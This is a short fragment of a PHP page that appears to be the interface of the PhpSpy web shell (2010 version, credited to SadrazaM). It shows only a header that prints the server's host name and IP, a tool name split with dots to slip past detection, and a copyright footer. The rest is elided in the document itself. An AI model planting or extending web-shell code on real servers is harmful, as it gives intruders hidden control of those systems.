...
<table width="100%" border="0" cellpadding="0" cellspacing="0">
	<tr class="head">
		<td><span style="float:right;"><a href="# target="_blank"><?php echo str_replace('.', '', 'P.h.p.S.p.y'); ?> Ver: 2010 </a></span><?php echo $_SERVER['HTTP_HOST']; ?> (<?php echo gethostbyname($_SERVER['SERVER_NAME']); ?>)</td>
	</tr>
	<tr class="alt1">
...
ob_end_flush(); ?></span>
	Copyright (C) 2000-2010 <a href="http://www.dcvi.net" target="_blank">SadrazaM</a> All Rights Reserved.
</div>
</body>
</html>
